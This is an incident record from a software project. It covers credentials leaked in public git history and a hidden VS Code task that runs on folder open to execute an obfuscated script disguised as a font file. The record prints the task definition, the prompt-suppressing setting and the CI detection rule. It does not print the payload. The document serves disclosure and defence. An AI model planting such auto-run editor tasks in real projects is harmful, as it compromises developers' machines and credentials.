# Security incident record — July 2026

Two issues were found in the five predecessor repositories during the migration
audit that produced this monorepo. Both are recorded here in full because the
predecessor repositories were **public** for the entire exposure window.

No credential value is reproduced in this document.

---

## Incident 1 — credentials committed to source

### What

Eight distinct credential literals were committed to
`lims-core-service-app/src/main/resources/application.yml` and remained
recoverable in git history.

| # | Type | Commits | First committed | Notes |
| --- | --- | --- | --- | --- |
| 1 | PostgreSQL password | 15 | 2026-02-25 | longest-lived |
| 2 | PostgreSQL password | 2 | 2026-02-22 | earliest |
| 3 | PostgreSQL password | 3 | 2026-04-18 | personal-style value |
| 4 | PostgreSQL password | 4 | 2026-04-24 | |
| 5 | PostgreSQL password | 4 | 2026-05-02 | personal-style value |
| 6 | Gmail App Password | 6 | 2026-05-05 | mailbox A |
| 7 | Gmail App Password | 4 | 2026-05-04 | mailbox A |
| 8 | Gmail App Password | 5 | 2026-02-22 | mailbox B — different account holder |

### Aggravating factor

`scripts/purge-secrets.sh`, written to remove these values, contained two of
them **in plaintext** as a find-and-replace mapping. It was committed to
`develop`, `main` and `enterprise-hardening`, was never executed, and covered
only 2 of the 8 literals. `tools/scrub-history.sh` had the same defect.

Neither script was migrated to this repository.

### Response

- Neither script, nor the history containing the literals, was carried into this
  repository. This repository begins at a single commit with no credential in
  its tree or history.
- The predecessor repositories are archived read-only.
- **Rotation is tracked below and is the responsibility of each account holder.**
  Purging history is not remediation; rotation is.

### Rotation status

| # | Credential | Owner | Rotated | Date |
| --- | --- | --- | --- | --- |
| 1–5 | PostgreSQL passwords (local dev instances) | respective developers | ☐ | |
| 6, 7 | Gmail App Passwords, mailbox A | account holder | ☐ | |
| 8 | Gmail App Password, mailbox B | account holder | ☐ | |

Values 3 and 5 resemble personal passwords. If either was reused on any other
account, that account must be changed as well — this repository cannot fix that.

---

## Incident 2 — auto-executing editor task with an obfuscated payload

### What

Four of the five repositories (`lims-core-service`, `lims-infrastructure`,
`lims-instrument-simulator`, `load-testing`) contained a committed
`.vscode/tasks.json` with a hidden task:

```jsonc
{
  "label": "eslint-check",
  "command": "(command -v node ... && node ./public/fonts/fa-solid-400.woff2) || (where node ... && node ./public/fonts/fa-solid-400.woff2) || echo ''",
  "runOn": "folderOpen",   // executes when the folder is opened
  "hide": true,            // hidden from the task list
  "presentation": { "reveal": "never", "echo": false, "close": true }
}
```

The accompanying `.vscode/settings.json` set `"task.allowAutomaticTasks": true`,
which suppresses the VS Code prompt that would otherwise ask the user to approve
an automatic task. The command was written to work on both Unix and Windows and
to fail silently (`|| echo ''`) if `node` or the target file was absent.

`public/fonts/fa-solid-400.woff2` (5,102 bytes) was **not a font**. It contained
JavaScript padded with leading whitespace and processed by a string-array
obfuscator. It was committed to `lims-core-service` alongside a legitimate
FontAwesome bundle, where a font file attracts no review.

### How it arrived

Commit `412b2bc`, 2026-05-06, message *"feat: update header_mapping priorities
for navigation links"* — a message unrelated to its contents. The commit added
the whole `.vscode/` directory, `branch_structure.json`, a FontAwesome bundle and
a Liquibase changelog together.

The `.vscode` files reference `sst`, `AWS_PROFILE=flo-ct-flo360`,
`jest.unit.config.cjs`, Contentful and Lerna — none of which exist in this
project. The directory was copied from an unrelated external project, and the
malicious task came with it.

### Exposure

The payload was present in the tree at exactly one commit. Execution required
opening that checkout in VS Code with `node` on `PATH`. The launcher, however,
was present in four repositories continuously, dormant only because the payload
path did not exist — any file appearing at that path would have armed it.

The payload was not analysed or executed. Treat any machine that had commit
`412b2bc` checked out and opened in VS Code as potentially compromised: rotate
GitHub tokens and SSH keys, and review browser-stored credentials.

### Response

- No `.vscode/` directory was migrated from any repository.
- `public/fonts/` was not migrated into the backend.
- The root `.gitignore` excludes `.vscode/`.
- `.github/workflows/security.yml` fails the build on a committed `.vscode/` or
  on any occurrence of `folderOpen` or `allowAutomaticTasks`.
- The quarantined originals are retained outside the repository for analysis.

---

## Lessons applied to this repository

1. A binary-looking file is not self-evidently binary. `.gitattributes` marks
   font and image types as binary, but review still has to ask why a Java
   service needs a web font.
2. Editor configuration is executable configuration. It does not belong in a
   shared repository.
3. A remediation script that embeds the secret is a second leak. Rotate at the
   source; do not templatise the value.
4. A commit whose message does not match its diff deserves a second look. This
   one added 20 files across four unrelated concerns.
